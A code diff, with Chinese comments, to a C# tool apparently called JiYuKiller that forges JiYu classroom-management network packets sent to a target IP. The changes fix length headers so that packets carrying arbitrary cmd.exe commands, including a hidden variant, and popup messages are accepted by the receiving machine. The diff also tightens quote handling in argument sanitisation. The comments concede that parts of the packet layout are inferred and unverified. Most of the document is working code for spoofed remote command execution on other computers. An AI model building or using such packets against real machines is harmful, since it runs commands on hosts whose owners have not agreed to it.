@@ -150,7 +150,8 @@ namespace JiYuKiller.Core
         /// <summary>
         /// 净化"打开文件/网页"的参数。该参数最终由目标机的 cmd 解释执行,
         /// 不净化的话: 引号可闭合参数注入任意命令、&amp;|&lt;&gt;^ 会拆分/改写命令、
-        /// %var% 会被 cmd 展开。处理: % 与控制字符直接拒绝; 引号翻倍;
+        /// %var% 会被 cmd 展开。处理: % 与引号与控制字符直接拒绝
+        /// (引号翻倍的方案依赖"中间无其他解析层"的假设, 直接拒绝最稳妥);
         /// 其余(含 &amp; | &lt; &gt; ^)交给调用方用引号包裹后即为字面量。
         /// </summary>
         public static string SanitizeStartArgument(string text)
@@ -164,8 +165,10 @@ namespace JiYuKiller.Core
                     throw new FormatException("内容包含控制字符");
                 if (c == '%')
                     throw new FormatException("内容不能包含 % (会被 cmd 当作变量展开)");
+                if (c == '"')
+                    throw new FormatException("内容不能包含引号");
             }
-            return text.Replace("\"", "\"\"");
+            return text;
         }
 
         /// <summary>
@@ -182,6 +185,9 @@ namespace JiYuKiller.Core
         /// <summary>
         /// 远程系统命令：cmd.exe 模板尾部（"/c " 或 "/k "）后追加命令文本(UTF-16LE)。
         /// hidden=true 对应原版 "/h " 前缀（cmd /c，执行后退出）。
+        /// 模板内 @23/@27 的 datalen 是按原版 893B 整包（含原命令）捕获的 865,
+        /// 拼接自定义命令后必须按 BuildLaunch 同款规则写回 datalen = 总长 - 28,
+        /// 否则命令长度与 164 字符不等时长度头与包体不符。
         /// </summary>
         public static byte[] BuildCommand(IPAddress target, string cmd, bool hidden)
         {
@@ -193,12 +199,20 @@ namespace JiYuKiller.Core
             var full = new byte[pkt.Length + arg.Length];
             Buffer.BlockCopy(pkt, 0, full, 0, pkt.Length);
             Buffer.BlockCopy(arg, 0, full, pkt.Length, arg.Length);
+
+            int datalen = full.Length - 28;
+            full[23] = (byte)datalen; full[24] = (byte)(datalen >> 8);
+            full[25] = (byte)(datalen >> 16); full[26] = (byte)(datalen >> 24);
+            full[27] = (byte)datalen; full[28] = (byte)(datalen >> 8);
+            full[29] = (byte)(datalen >> 16); full[30] = (byte)(datalen >> 24);
             return full;
         }
 
         /// <summary>
         /// 极域弹窗消息。原版动态拼装（常量 pool[168]/[198] 12字节头 + utf-16 去BOM + 29 字节 0 填充）。
         /// 结构为推断, IP 紧跟 12 字节头之后(@12), 待真机验证。
+        /// 注: 头内 datalen@8 保留捕获值(878/926) —— 原版即用固定头动态拼装变长消息,
+        /// 说明该子类型不校验 datalen, 改动反而偏离已验证行为。
         /// </summary>
         public static byte[] BuildMessage(IPAddress target, string text, int port)
         {
@@ -279,13 +293,15 @@ namespace JiYuKiller.Core
         ///   [16..]   命令文本(UTF-16LE, 不带 /h)
         ///   其余补零至 datalen+28 (原版为定长包)
         /// 真机若无效, 优先调整 IP 偏移(12) 与补零长度。
+        /// 头选择与 BuildMessage 一致: 4605 用 2010 头, 其余(4705/4988)用 2021 族头。
+        /// 命令超长导致包体超过 datalen+28 时, datalen@8 按实际长度写回保持自洽。
         /// </summary>
         public static byte[] BuildHiddenCommand(IPAddress target, string cmd, int port)
         {
             if (cmd != null && cmd.StartsWith("/h ", StringComparison.Ordinal))
                 cmd = cmd.Substring(3);
 
-            byte[] header = port == JyVersion.Port4705 ? MsgHeader4705 : MsgHeader4605;
+            byte[] header = port == JyVersion.Port4605 ? MsgHeader4605 : MsgHeader4705;
             int datalen = BitConverter.ToInt32(header, 8);
             if (datalen <= 0 || datalen > 8192)
                 datalen = 878;                      // 4605 默认值(pool[168] = 0x36e)
@@ -298,6 +314,12 @@ namespace JiYuKiller.Core
             byte[] v4 = target.GetAddressBytes();
             Buffer.BlockCopy(v4, 0, pkt, 12, 4);
             Buffer.BlockCopy(body, 0, pkt, 16, body.Length);
+            if (pkt.Length != total)
+            {
+                int actual = pkt.Length - 28;
+                pkt[8] = (byte)actual; pkt[9] = (byte)(actual >> 8);
+                pkt[10] = (byte)(actual >> 16); pkt[11] = (byte)(actual >> 24);
+            }
             return pkt;
         }
     }
